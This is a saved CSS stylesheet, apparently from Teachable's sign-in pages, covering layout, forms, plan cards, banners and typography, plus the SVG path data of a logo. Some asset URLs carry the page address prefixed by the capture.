.my-teachable-layout .contact-main .contact-form .form-group-success div, .my-teachable-layout .contact-main .contact-form .form-group-success p, .my-teachable-layout .contact-main .contact-form .form-group-success a { color: rgb(43, 134, 127); }

.my-teachable-layout .contact-main .contact-form .form-group-success p:last-child { margin-bottom: 0px; }

.my-teachable-layout .contact-main .contact-form .form-group-info { background: rgb(251, 249, 241); }

.my-teachable-layout .contact-main .contact-form .form-group-info .control-label { color: rgb(253, 126, 65); line-height: 24px; margin-bottom: 3px; font-size: 13px; font-weight: 800; }

.my-teachable-layout .contact-main .contact-form .form-group-info .fa-question { margin-right: 5px; background: rgb(253, 126, 65); color: rgb(255, 255, 255); padding: 4px 5px; border-radius: 50%; width: 18px; height: 18px; line-height: 10px; }

.my-teachable-layout .contact-main .contact-form .form-group-info div, .my-teachable-layout .contact-main .contact-form .form-group-info p, .my-teachable-layout .contact-main .contact-form .form-group-info a { color: rgb(138, 124, 124); }

.my-teachable-layout .contact-main .contact-form .form-group-info p:last-child { margin-bottom: 0px; }

.my-teachable-layout .contact-main .contact-form .form-group-problem { background: rgb(251, 251, 251); }

.my-teachable-layout .contact-main .contact-form .form-group-problem .control-label { color: rgb(152, 102, 112); line-height: 24px; margin-bottom: 3px; font-size: 13px; font-weight: 800; }

.my-teachable-layout .contact-main .contact-form .form-group-problem .fa-question { margin-right: 5px; background: rgb(152, 102, 112); padding: 4px 5px; border-radius: 50%; width: 18px; height: 18px; line-height: 10px; color: white; }

.my-teachable-layout .contact-main .contact-form .form-group-problem div, .my-teachable-layout .contact-main .contact-form .form-group-problem p, .my-teachable-layout .contact-main .contact-form .form-group-problem a { color: rgb(152, 102, 112); }

.my-teachable-layout .contact-main .ngProgressLiteBar { background: rgb(255, 127, 69); }

.my-teachable-layout .contact-main textarea { height: 300px; padding: 9px 13px; font-size: 13px; box-shadow: none; font-weight: 200; margin-bottom: 20px; transition: all 0.3s ease 0s; border-radius: 4px; }

.my-teachable-layout .contact-main textarea::-webkit-input-placeholder { color: rgb(185, 185, 185) !important; }

.my-teachable-layout .contact-main textarea::placeholder { color: rgb(185, 185, 185) !important; }

.my-teachable-layout .contact-main select { width: 100%; }

.my-teachable-layout .contact-main select:focus { border: 1px solid rgb(204, 204, 204) !important; }

.my-teachable-layout .contact-main .has-success select, .my-teachable-layout .contact-main .has-success .form-control { border: 1px solid rgb(204, 204, 204) !important; }

.my-teachable-layout .contact-main .has-success select:focus, .my-teachable-layout .contact-main .has-success .form-control:focus { border: 1px solid rgb(148, 148, 148) !important; }

.my-teachable-layout .contact-loader { position: absolute; top: 50%; left: calc(50% + 118px); z-index: -1; }

@media screen and (max-width: 767px) {
  .my-teachable-layout .contact-loader { left: 50%; margin-top: 30%; }
}

.my-teachable-layout .contact-loader .line { animation: 1s ease-in-out 0s infinite normal none running expand; border-radius: 10px; display: inline-block; transform-origin: center center; margin: 0px 3px; width: 1px; height: 15px; }

.my-teachable-layout .contact-loader .line:nth-child(1) { background: rgb(255, 127, 69); }

.my-teachable-layout .contact-loader .line:nth-child(2) { animation-delay: 180ms; background: rgb(255, 127, 69); }

.my-teachable-layout .contact-loader .line:nth-child(3) { animation-delay: 360ms; background: rgb(255, 127, 69); }

.my-teachable-layout .contact-loader .line:nth-child(4) { animation-delay: 540ms; background: rgb(255, 127, 69); }

@-webkit-keyframes expand { 
  0% { transform: scale(1); }
  25% { transform: scale(2); }
}

@keyframes expand { 
  0% { transform: scale(1); }
  25% { transform: scale(2); }
}

.my-teachable-layout .ngProgressLiteBar { background: rgb(255, 127, 69); }

.my-teachable-layout #HW_frame_cont.HW_visible { top: 60px !important; }

.my-teachable-layout .plans-wrapper { clear: both; display: flex; }

.my-teachable-layout .plans-wrapper .coupon-applied { background: rgb(255, 240, 169); position: absolute; font-size: 11px; font-weight: 600; line-height: 20px; padding: 2px 10px; left: 50%; margin-top: 1px; color: rgb(255, 127, 69); transform: translate(-50%, -50%); width: 120px; border-radius: 3px; text-align: center; }

.my-teachable-layout .plans-wrapper .plan { background: rgb(255, 255, 255); border-radius: 5px; border: 1px solid rgb(202, 216, 238); display: block; float: left; font-size: 21px; line-height: 75px; margin-right: 10px; margin-top: auto; margin-bottom: 0px; min-width: 143px; width: 33%; text-align: left; position: relative; }

@media screen and (max-width: 600px) {
  .my-teachable-layout .plans-wrapper .plan { width: 100%; }
  .my-teachable-layout .plans-wrapper .plan img.badge-overlay { position: absolute; right: 39px; margin-top: -4px; }
}

.my-teachable-layout .plans-wrapper .plan.plan-selected, .my-teachable-layout .plans-wrapper .plan:hover { background: rgb(255, 255, 255); border-color: rgb(162, 162, 162); }

.my-teachable-layout .plans-wrapper .plan.plan-selected { background: rgb(255, 255, 255); border-color: rgb(255, 127, 69); }

.my-teachable-layout .plans-wrapper .plan.plan-selected .plan-check { display: block; }

.my-teachable-layout .plans-wrapper .plan .plan-check { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-check.svg"); width: 24px; height: 25px; position: absolute; right: -6px; top: -6px; display: none; }

.my-teachable-layout .plans-wrapper .plan .plan-name { font-size: 13px; text-align: center; color: rgb(87, 87, 87); font-weight: 600; margin-top: 13px; }

.my-teachable-layout .plans-wrapper .plan .plan-price { margin: 7px auto 20px; font-size: 13px; max-width: 379px; line-height: 19px; text-align: center; color: rgb(133, 146, 166); font-weight: 100; }

.my-teachable-layout .plans-wrapper .plan .plan-price .plan-price-amount { font-size: 13px; color: rgb(132, 146, 150); font-weight: 600; }

.my-teachable-layout .plans-wrapper .plan .plan-price a { color: rgb(144, 216, 210); }

.my-teachable-layout .plans-wrapper .plan .plan-icon { background-repeat: no-repeat; background-position: 50% 25px; background-size: 63px; height: 86px; }

.my-teachable-layout .plans-wrapper .plan input.form-control { padding: 5px 15px; height: 48px; font-size: 14px; box-shadow: none; font-weight: 200; margin-bottom: 14px; transition: all 0.3s ease 0s; border-radius: 4px; }

@media screen and (max-width: 600px) {
  .my-teachable-layout .plans-wrapper .plan { width: 95%; }
}

.my-teachable-layout .plans-wrapper .plan label.description { font-family: Domine; font-size: 13px; color: rgb(142, 142, 142); line-height: 22px; font-weight: 100; }

.my-teachable-layout .plans-wrapper .plan .bottom-breadcrumb { position: absolute; background: rgb(246, 246, 246); width: 100%; text-align: right; margin-left: -40px; border-radius: 0px 0px 8px 8px; margin-top: 30px; line-height: 32px; }

.my-teachable-layout .plans-wrapper .plan .bottom-breadcrumb .next-step { display: inline; font-size: 9px; color: rgb(165, 165, 165); margin-right: 4px; }

.my-teachable-layout .plans-wrapper .plan .bottom-breadcrumb .step-name { display: inline; font-size: 9px; color: rgb(146, 146, 146); font-weight: 600; margin-right: 10px; }

.my-teachable-layout .plans-wrapper .plan.plan-free .plan-icon { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/admin/assets/images/plan-free.svg"); }

.my-teachable-layout .plans-wrapper .plan.plan-basic .plan-icon { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/admin/assets/images/plan-basic.svg"); }

.my-teachable-layout .plans-wrapper .plan.plan-professional img.badge-overlay { position: absolute; right: -2px; margin-top: -2px; }

.my-teachable-layout .plans-wrapper .plan.plan-professional .plan-icon { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/admin/assets/images/plan-professional.svg"); }

.my-teachable-layout .plans-wrapper .plan.plan-high_volume .plan-icon { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/admin/assets/images/plan-high-volume.svg"); }

.my-teachable-layout .welcome-banner { width: 100%; z-index: 100; padding: 40px 50px 50px 330px; background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-myteachable.svg"); background-repeat: no-repeat; background-position: 60px 40px; background-color: rgb(255, 255, 255); background-size: 220px; box-shadow: rgb(227, 231, 234) 0px 8px 20px; margin-bottom: 80px; position: relative; margin-top: 20px; border-radius: 6px; }

@media screen and (max-width: 767px) {
  .my-teachable-layout .welcome-banner { padding: 190px 30px 30px; background-position: 30px 40px; background-size: 130px; position: absolute; top: -350px; width: calc(100% - 41px); }
}

@media screen and (min-width: 767px) and (max-width: 1100px) {
  .my-teachable-layout .welcome-banner { padding: 190px 50px 30px; background-position: 50px 40px; background-size: 130px; }
}

@media screen and (min-width: 1100px) and (max-width: 1300px) {
  .my-teachable-layout .welcome-banner { background-size: 150px; padding-left: 240px; background-position: 50px 40px; }
}

.my-teachable-layout .welcome-banner p:last-child { margin-bottom: 0px; }

.my-teachable-layout .welcome-banner .close-icon { position: absolute; font-weight: 100; font-size: 26px; color: rgb(202, 218, 233); top: 30px; right: 30px; background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-close.svg") no-repeat; width: 16px; height: 17px; opacity: 0.7; }

.my-teachable-layout .welcome-banner .close-icon:hover { opacity: 1; }

.my-teachable-layout .welcome-banner .illustration-left { position: absolute; top: 58px; }

.my-teachable-layout .welcome-banner .user-info-wrapper { width: 100%; float: left; }

.my-teachable-layout .welcome-banner .user-info-wrapper .user-info { background: rgb(245, 246, 247); display: block; float: left; color: rgb(0, 0, 0); border-radius: 30px; margin-right: 20px; margin-bottom: 22px; }

.my-teachable-layout .welcome-banner .user-info-wrapper .user-info .user-info-label { color: rgb(51, 53, 58); border-right: 1px solid rgb(230, 230, 230); padding: 10px 16px 11px 20px; line-height: 16px; display: block; font-size: 12px; float: left; }

.my-teachable-layout .welcome-banner .user-info-wrapper .user-info .user-info-value { width: 222px; padding: 6px 20px 0px 15px; font-size: 10px; line-height: 38px; overflow-wrap: break-word; color: rgb(133, 146, 166); }

@media screen and (max-width: 600px) {
  .my-teachable-layout .welcome-banner .user-info-wrapper .user-info { border-radius: 10px; margin-right: 20px; padding: 14px 0px; width: 100%; }
  .my-teachable-layout .welcome-banner .user-info-wrapper .user-info .user-info-label { float: none; border-right: 0px; line-height: 3px; }
  .my-teachable-layout .welcome-banner .user-info-wrapper .user-info .user-info-value { width: 100%; display: block; line-height: 20px; padding-top: 2px; }
}

@media screen and (min-width: 767px) and (max-width: 1000px) {
  .my-teachable-layout .welcome-banner .user-info-wrapper .user-info { border-radius: 10px; margin-right: 20px; padding: 14px 0px; width: 100%; }
  .my-teachable-layout .welcome-banner .user-info-wrapper .user-info .user-info-label { float: none; border-right: 0px; line-height: 3px; }
  .my-teachable-layout .welcome-banner .user-info-wrapper .user-info .user-info-value { width: 100%; display: block; line-height: 20px; }
}

.my-teachable-layout .welcome-banner h1 { font-size: 20px; padding-left: 0px; max-width: 600px; margin-top: 5px; }

@media screen and (max-width: 600px) {
  .my-teachable-layout .welcome-banner h1 { font-size: 16px; }
}

.my-teachable-layout .welcome-banner p { font-size: 13px; max-width: 600px; line-height: 24px; margin-bottom: 19px; color: rgb(133, 146, 166); }

.my-teachable-layout .welcome-banner p.bold { color: rgb(71, 80, 94); font-weight: 600; }

.my-teachable-layout .welcome-banner p a { font-weight: 600; text-decoration: underline; }

.my-teachable-layout .label-user-type { vertical-align: 2px; margin-left: 5px; margin-right: 6px; font-size: 9px; font-weight: 700; padding: 7px 13px 6px; text-transform: uppercase; border-radius: 16px; }

.my-teachable-layout .label-user-type.label-owner { background: rgb(201, 243, 240); color: rgb(28, 138, 130); border: 1px solid rgb(177, 214, 211); }

.my-teachable-layout .label-user-type.label-student { background: rgb(203, 241, 254); color: rgb(53, 117, 142); border: 1px solid rgb(173, 200, 210); }

.my-teachable-layout .label-user-type.label-author, .my-teachable-layout .label-user-type.label-affiliate { background: rgb(255, 221, 223); color: rgb(187, 112, 115); border: 1px solid rgb(214, 189, 190); }

.my-teachable-layout .label-user-type.label-free, .my-teachable-layout .label-user-type.label-school-trial, .my-teachable-layout .label-user-type.label-school-offline { background: rgb(239, 239, 239); color: rgb(95, 95, 95); }

.my-teachable-layout .label-user-type.label-basic, .my-teachable-layout .label-user-type.label-professional, .my-teachable-layout .label-user-type.label-high_volume, .my-teachable-layout .label-user-type.label-business { background: rgb(253, 236, 228); color: rgb(233, 126, 11); }

.my-teachable-layout .label-user-type.label-school-offline, .my-teachable-layout .label-user-type.label-school-trial { position: absolute; top: 10px; left: 5px; }

.my-teachable-layout .schools-list { display: flex; flex-flow: row wrap; -webkit-box-orient: horizontal; -webkit-box-direction: normal; }

@media (min-width: 767px) {
  .my-teachable-layout .schools-list { margin: -10px 0px 0px -10px; }
}

.my-teachable-layout .schools-list.no-animations .school-card { transition: none 0s ease 0s; }

.my-teachable-layout .schools-list.no-animations .school-card:hover { box-shadow: rgb(227, 231, 234) 0px 8px 20px; transform: none; }

.my-teachable-layout .schools-list .school-card { display: block; margin: 20px 20px 40px; padding: 0px; min-height: 350px; position: relative; border-radius: 5px; background-size: 130%; background-repeat: no-repeat; box-shadow: rgb(227, 231, 234) 0px 8px 20px; transition: all 0.15s ease-in 0s; background-position: center top; }

.my-teachable-layout .schools-list .school-card:hover { background-repeat: no-repeat; box-shadow: rgba(50, 50, 93, 0.12) 0px 30px 100px, rgba(50, 50, 93, 0.1) 0px 10px 20px; transform: translateY(-4px); }

.my-teachable-layout .schools-list .school-card:hover .school-name { color: rgb(9, 165, 154); }

.my-teachable-layout .schools-list .school-card .school-favicon { width: 50px; height: 50px; border-radius: 50%; position: absolute; top: -30px; left: 30px; z-index: 10; background-color: rgb(255, 255, 255); box-shadow: rgb(193, 197, 197) 0px 2px 21px 0px; }

.my-teachable-layout .schools-list .school-card .school-info { background: rgb(255, 255, 255); position: absolute; width: 100%; bottom: 0px; border-radius: 0px 0px 4px 4px; padding: 40px 20px 30px 30px; min-height: 160px; }

.my-teachable-layout .schools-list .school-card .school-info span { color: black; }

.my-teachable-layout .schools-list .school-card .school-name { color: rgb(0, 0, 0); font-size: 16px; font-weight: 600; line-height: 23px; margin-top: 2px; margin-bottom: 0px; overflow-wrap: break-word; }

.my-teachable-layout .schools-list .school-card .school-url { font-size: 13px; padding-bottom: 14px; color: rgb(143, 157, 165); font-weight: 500; line-height: 17px; margin-top: 6px; margin-bottom: 4px; overflow-wrap: break-word; }

.my-teachable-layout .schools-list .school-card .raquo { line-height: 35px; float: right; font-size: 28px; font-weight: 100; font-family: inherit; color: rgb(167, 167, 167); }

.my-teachable-layout .schools-list .school-card .school-card-footer { display: flex; -webkit-box-align: end; align-items: end; -webkit-box-pack: justify; justify-content: space-between; }

.my-teachable-layout .schools-list .school-card .school-card-footer .action-required-wrapper { font-size: 9px; border-radius: 18px; background-color: rgb(255, 229, 229); color: rgb(204, 0, 0); padding: 2px 6px; text-transform: uppercase; }

@media screen and (min-width: 0px) and (max-width: 500px) {
  .my-teachable-layout .schools-list { -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; }
  .my-teachable-layout .schools-list .school-card { flex-basis: 100%; }
}

@media screen and (min-width: 500px) and (max-width: 767px) {
  .my-teachable-layout .schools-list .school-card { flex-basis: calc(50% - 40px); }
}

@media screen and (min-width: 768px) and (max-width: 1000px) {
  .my-teachable-layout .schools-list { -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; }
  .my-teachable-layout .schools-list .school-card { flex-basis: 100%; }
}

@media screen and (min-width: 1000px) and (max-width: 1250px) {
  .my-teachable-layout .schools-list .school-card { flex-basis: calc(50% - 40px); }
}

@media screen and (min-width: 1250px) and (max-width: 1600px) {
  .my-teachable-layout .schools-list .school-card { flex-basis: calc(33% - 40px); }
}

@media screen and (min-width: 1600px) {
  .my-teachable-layout .schools-list .school-card { flex-basis: calc(25% - 40px); }
}

.my-teachable-layout .content-box.connect, .my-teachable-layout .content-box.unlink { display: block; min-height: 550px; max-height: 550px; background-color: rgb(255, 255, 255); }

.my-teachable-layout .content-box.connect.unlink, .my-teachable-layout .content-box.unlink.unlink { padding-top: 25%; }

.my-teachable-layout .content-box.connect .btn, .my-teachable-layout .content-box.unlink .btn { min-width: 295px; }

.my-teachable-layout .content-box.connect .alert, .my-teachable-layout .content-box.unlink .alert { max-width: 480px; }

.my-teachable-layout .content-box.connect .confirm-connect, .my-teachable-layout .content-box.unlink .confirm-connect { padding-top: 4%; }

.my-teachable-layout .content-box.connect .connected-error, .my-teachable-layout .content-box.unlink .connected-error { padding-top: 15%; }

.my-teachable-layout .content-box.connect h4, .my-teachable-layout .content-box.unlink h4 { font-size: 20px; font-weight: bold; color: rgb(71, 80, 94); margin: 0px auto 20px; }

.my-teachable-layout .content-box.connect p, .my-teachable-layout .content-box.unlink p { max-width: 400px; }

.my-teachable-layout .content-box.connect form, .my-teachable-layout .content-box.unlink form { text-align: left; }

.my-teachable-layout .content-box.connect .form-group, .my-teachable-layout .content-box.unlink .form-group { padding: 5px 70px; margin-bottom: 0px; }

.my-teachable-layout .content-box.connect .email, .my-teachable-layout .content-box.unlink .email { font-weight: 600; }

.my-teachable-layout .content-box.connect form .btn, .my-teachable-layout .content-box.unlink form .btn { margin: 0px auto; }

.my-teachable-layout .content-box.connect .modal-footer, .my-teachable-layout .content-box.unlink .modal-footer { display: block; width: calc(100% + 120px); padding: 25px 0px 0px; margin: 40px 0px 0px -60px; text-align: center; }

.my-teachable-layout .content-box.connect .modal-footer a, .my-teachable-layout .content-box.unlink .modal-footer a { font-size: 13px; color: rgb(133, 146, 166); line-height: 25px; text-decoration: underline; font-weight: 500; }

.my-teachable-layout.my-teachable-dashboard { padding: 20px; height: 100%; position: relative; width: 100%; }

.my-teachable-layout.my-teachable-dashboard .sticky-center-container { margin-left: 137px; }

.my-teachable-layout.my-teachable-dashboard h1 { padding-left: 5px; font-size: 17px; font-weight: 600; margin-bottom: 33px; color: var(--plumette); }

@media screen and (max-width: 767px) {
  .my-teachable-layout.my-teachable-dashboard .sticky-center-container { margin-left: 0px; }
}

@media screen and (min-width: 768px) and (max-width: 930px) {
  .my-teachable-layout.my-teachable-dashboard .sticky-center-container { left: 50%; margin-top: 0px; width: calc(100% - 275px); }
}

@media screen and (min-width: 768px) {
  .my-teachable-layout.my-teachable-dashboard { position: absolute; padding-right: 50px; padding-top: 28px; padding-left: 325px; }
}

.auth-flow { background-color: var(--clinical); }

.auth-flow__top-bar { height: 64px; position: absolute; background-color: var(--clinical); border-bottom: 1px solid var(--obsidian); }

.auth-flow__content { -webkit-box-flex: 1; flex: 1 1 auto; height: 100%; padding-top: 104px; }

.auth-flow .form-error { margin-left: auto; margin-right: auto; max-width: 364px; }

.onboarding-flow { height: 100vh; position: relative; background-color: var(--clinical); }

.onboarding-flow__progress-bar { position: absolute; height: 8px; top: 0px; left: 0px; background-color: var(--grey-area); }

.onboarding-flow__progress-bar-indicator { height: 100%; width: 33%; background-color: var(--teachable-green); border-radius: 0px 4px 4px 0px; }

.onboarding-flow__content { max-width: 600px; }

.onboarding-flow__skip, .onboarding-flow__submit { position: absolute; width: calc(100% - 64px); left: 32px; }

.onboarding-flow__skip { text-align: center; bottom: 32px; }

.onboarding-flow__submit { bottom: 76px; }

@media (min-width: 415px) {
  .onboarding-flow__skip, .onboarding-flow__submit { position: static; width: auto; }
}

.password-flow__content { max-width: 578px; background-color: var(--white); border-radius: 6px; }

.password-flow__form-wrapper { -webkit-box-flex: 1; flex: 1 0 auto; }

.password-flow__form { max-width: 325px; }

.password-flow__header { word-break: break-word; }

.password-flow__header.heading2 { font-family: Reckless-Light, Palatino, Garamond, Georgia, serif; margin-bottom: 32px; font-weight: 300; animation: 250ms cubic-bezier(0.32, 0, 0.67, 0) 0s 1 normal none running fadeIn; }

@keyframes fadeIn { 
  0% { opacity: 0; filter: blur(2px); }
  100% { opacity: 1; filter: blur(0px); }
}

.password-flow__links { -webkit-box-flex: 0; flex: 0 0 auto; -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; }

.password-flow__link { height: 64px; }

.auth-form:not(.auth-form--error) { height: 100%; -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-flow: column nowrap; }

.auth-form__header { word-break: break-word; }

.auth-form__header.heading2 { font-family: Reckless-Light, Palatino, Garamond, Georgia, serif; margin-bottom: 32px; font-weight: 300; animation: 250ms cubic-bezier(0.32, 0, 0.67, 0) 0s 1 normal none running fadeIn; }

.auth-form__header.school_heading { max-width: 240px; }

@keyframes fadeIn { 
  0% { opacity: 0; filter: blur(2px); }
  100% { opacity: 1; filter: blur(0px); }
}

.auth-form__subheader { color: var(--slate); }

.auth-form__subheader strong { color: var(--obsidian); font-weight: 600; }

.auth-form__form { max-width: 300px; }

.auth-form .footer__links { border-top: 1px solid var(--gravel); }

.auth-form .footer__link { display: block; }

.auth-form .footer__link img { width: 20px; height: 20px; border-radius: 50%; margin-right: 10px; margin-top: -4px; }

.auth-form .subheading { max-width: 300px; }

.auth-form .icon-e { float: right; margin-left: -30px; margin-top: 12px; position: absolute; z-index: 2; opacity: 0.4; }

.rebrand-2020 .form-label { color: var(--slate); }

.rebrand-2020 .form-input { background-color: var(--clinical); height: 40px; appearance: none; caret-color: var(--squid-ink); border-radius: 5px; border: 1px solid var(--grey-area); transition: border-color 0.2s ease 0s; }

.rebrand-2020 .form-input::-webkit-input-placeholder { color: var(--concrete); }

.rebrand-2020 .form-input::placeholder { color: var(--concrete); }

.rebrand-2020 .form-input:not(:disabled):focus { outline: 0px; }

.rebrand-2020 .form-input:not(:disabled):focus:not(.error) { border-color: var(--plumette); }

.rebrand-2020 .form-input:hover { border-color: var(--concrete); }

.rebrand-2020 .form-input:disabled:hover { border-color: var(--grey-area); }

.rebrand-2020 .form-input.error { border-color: var(--red-herring); }

.rebrand-2020 .message, .rebrand-2020 .form-error { color: var(--squid-ink); border-width: 1px; border-style: solid; border-radius: 4px; }

.rebrand-2020 .message--success { background-color: var(--air-plant); border-color: var(--vintage-mint); }

.rebrand-2020 .message--issue, .rebrand-2020 .form-error { background-color: var(--petal-pink); border-color: var(--carnation); }

.rebrand-2020 .message--info { background-color: var(--summer-breeze); border-color: var(--purple-haze); }

.rebrand-2020 .message--warning { background-color: var(--vanilla-wafer); border-color: var(--buttermilk); }

.rebrand-2020 .message svg, .rebrand-2020 .form-error svg { -webkit-box-flex: 0; flex: 0 0 auto; }

.rebrand-2020 .message ul, .rebrand-2020 .form-error ul { padding: 0px; margin-bottom: 0px; list-style: none; }

.rebrand-2020 .inline-error { margin-top: 4px; }

.rebrand-2020 .button { color: var(--clinical); background-color: var(--obsidian); max-width: 570px; min-width: 120px; border-radius: 6px; border: none; white-space: nowrap; touch-action: manipulation; transition: opacity 0.3s ease 0s; cursor: pointer; }

.rebrand-2020 .button:disabled { opacity: 0.4; pointer-events: none; }

.rebrand-2020 .button:hover:not(:disabled) { background-color: var(--black); }

.rebrand-2020 .secondary-button { color: var(--obsidian); background-color: var(--clinical); max-width: 570px; min-width: 120px; border-radius: 6px; border: 1px solid var(--gravel); white-space: nowrap; touch-action: manipulation; transition: opacity 0.3s ease 0s; cursor: pointer; }

.rebrand-2020 .secondary-button:disabled { opacity: 0.4; pointer-events: none; }

.rebrand-2020 .secondary-button:hover:not(:disabled) { border: 1px solid var(--iron-ore); }

.checkbox { min-height: 16px; position: relative; width: 16px; height: 16px; appearance: none; left: 0px; top: 0px; border: 0px; }

.checkbox:hover { cursor: pointer; }

.checkbox::after { display: block; position: absolute; content: ""; width: 16px; height: 16px; border: 1px solid var(--obsidian); border-radius: 2px; left: 0px; top: 0px; }

.checkbox:checked::before { display: block; position: absolute; content: ""; left: 4px; top: 5px; border-left: 2px solid var(--obsidian); border-bottom: 2px solid var(--obsidian); height: 4px; width: 8px; transform: rotate(-45deg); outline: 0px; transition: outline 0.2s ease 0s; }

input[type="checkbox"]:focus { outline: 0px; box-shadow: 0px 0px 1px 3px var(--gravel); }

.authorizations-new-container { background-color: var(--clinical); min-height: 100vh; }

.authorizations-new-container .top-bar { height: 64px; background-color: var(--clinical); border-bottom: 1px solid var(--obsidian); }

.authorizations-new-container .header-text { padding-top: 60px; text-align: center; }

.authorizations-new-container .authorize-form { width: 50%; padding: 10px; margin-left: auto; margin-right: auto; }

.authorizations-new-container .auth-buttons { display: inline-flex; padding-bottom: 20px; }

.authorizations-new-container .profile-card { text-align: center; }

.authorizations-new-container .profile-card img { border: 2px solid var(--fog); }

.authorizations-new-container .profile-card label { padding-top: 20px; }

.authorizations-new-container .auth-details { padding: 10px; }

.authorizations-new-container ul.detail-list { display: inline-block; background: var(--linen); padding: 20px; list-style: none; position: relative; text-align: left; }

.authorizations-new-container ul.detail-list .detail-header { padding: 5px; left: 30px; }

.authorizations-new-container ul.detail-list li { margin-left: 15px; padding: 12px; }

.authorizations-new-container ul.detail-list li::before { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/checkout-checkmark.svg"); background-size: 18px; content: ""; width: 18px; height: 18px; background-repeat: no-repeat; left: 20px; position: absolute; }

.authorizations-new-container ul.detail-list li:last-child { margin-bottom: 0px; }

.white-link-box { background-color: white; }

.page_div { background: none repeat; }

.page_div .container { background: rgb(255, 255, 255); padding-top: 30px; }

.full-height { height: 100%; }

.convert-existing { white-space: pre-wrap; }


.heading1, .heading2, .heading3, .heading4, .heading5, .heading6, .pageHeading, .bodyLead, .bodyLeadBold, .bodyMain, .bodyMainBold, .bodySmall, .bodySmallSemiBold { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Droid Sans", "Helvetica Neue", BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; }

.heading1 { font-size: 2.887rem; line-height: 4.33rem; font-weight: 600; }

.heading2 { font-size: 2.027rem; line-height: 3.041rem; font-weight: 600; }

.heading3 { font-size: 1.802rem; line-height: 2.703rem; font-weight: 600; }

.heading4 { font-size: 1.424rem; line-height: 2.136rem; font-weight: 600; }

.heading5 { font-size: 1.125rem; line-height: 1.688rem; font-weight: 600; }

.heading6 { font-size: 0.702rem; line-height: 1.053rem; text-transform: uppercase; font-weight: 600; }

.pageHeading { font-size: 1rem; line-height: 1.5rem; font-weight: 600; }

.bodyLead { font-size: 1rem; line-height: 1.5rem; font-weight: 400; }

.bodyLeadBold { font-size: 1rem; line-height: 1.5rem; font-weight: 600; }

.bodyMain { font-size: 0.889rem; line-height: 1.333rem; font-weight: 400; }

.bodyMainBold { font-size: 0.889rem; line-height: 1.333rem; font-weight: 600; }

.bodySmall { font-size: 0.79rem; line-height: 1.185rem; font-weight: 400; }

.bodySmallSemiBold { font-size: 0.79rem; line-height: 1.185rem; font-weight: 600; }

.reckless { font-family: Reckless-Light, Palatino, Garamond, Georgia, serif; font-weight: 300; animation: 250ms cubic-bezier(0.32, 0, 0.67, 0) 0s 1 normal none running fadeIn; }

@-webkit-keyframes fadeIn { 
  0% { opacity: 0; filter: blur(2px); }
  100% { opacity: 1; filter: blur(0px); }
}

@keyframes fadeIn { 
  0% { opacity: 0; filter: blur(2px); }
  100% { opacity: 1; filter: blur(0px); }
}

<svg width="132" height="50" viewBox="0 0 132 50" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M20.3859 16.4237V21.2393H23.7811V23.1564H20.3859V28.9076C20.3859 30.1401 21.0468 30.8247 22.1633 30.8247H23.7811V32.7418H21.981C19.6568 32.7418 18.1757 31.3268 18.1757 28.9761V23.1564H15.8286V21.2393H18.1757V16.4237H20.3859Z" fill="#222222"https://sso.teachable.com/secure/teachable_accounts/sign_in/>
<path d="M35.4706 28.9989C35.0605 31.3725 32.9869 32.9244 30.1613 32.9244C26.6066 32.9244 24.3963 30.1173 24.3963 26.9221C24.3963 23.7041 26.4015 21.0567 29.9334 21.0567C33.4882 21.0567 35.3794 23.59 35.3794 26.5113C35.3794 26.808 35.3567 27.1731 35.3339 27.3786H26.561C26.7434 29.5467 28.1561 31.0302 30.1613 31.0302C31.8475 31.0302 32.9412 30.2998 33.2603 28.9989H35.4706ZM26.6294 25.7582H33.1464C33.0096 24.0008 31.8248 22.8369 29.9334 22.8369C28.1333 22.8369 26.9712 23.8411 26.6294 25.7582Z" fill="#222222"https://sso.teachable.com/secure/teachable_accounts/sign_in/>
<path d="M46.636 25.3245V32.7419H44.4257V30.8704C43.8788 32.1028 42.4205 32.9244 40.6887 32.9244C38.3417 32.9244 36.7923 31.5095 36.7923 29.4554C36.7923 27.2416 38.5468 25.8723 41.2584 25.8723H43.651C44.175 25.8723 44.4257 25.5984 44.4257 25.1876C44.4257 23.7954 43.4231 22.8369 41.6458 22.8369C40.0508 22.8369 38.8886 23.8411 38.8202 25.005H36.7694C36.9518 22.7456 39.0025 21.0567 41.7141 21.0567C44.6764 21.0567 46.636 22.7684 46.636 25.3245ZM44.4257 27.698V27.4242H41.4634C39.9596 27.4242 38.9797 28.2001 38.9797 29.4097C38.9797 30.4595 39.8456 31.1671 41.1217 31.1671C43.218 31.1671 44.4257 29.8206 44.4257 27.698Z" fill="#222222"https://sso.teachable.com/secure/teachable_accounts/sign_in/>
<path d="M48.1855 26.9906C48.1855 23.8182 50.259 21.0567 53.8821 21.0567C56.5709 21.0567 58.8952 22.6543 59.2141 25.2561H57.0038C56.7988 23.9552 55.4771 22.9966 53.9277 22.9966C51.6263 22.9966 50.4881 24.7768 50.4881 26.9906C50.4881 29.2044 51.6501 30.9846 53.9277 30.9846C55.5 30.9846 56.6621 30.1629 57.0266 28.862H59.2141C58.8495 31.2812 56.7988 32.9244 53.8821 32.9244C50.259 32.9244 48.1855 30.1629 48.1855 26.9906Z" fill="#222222"https://sso.teachable.com/secure/teachable_accounts/sign_in/>
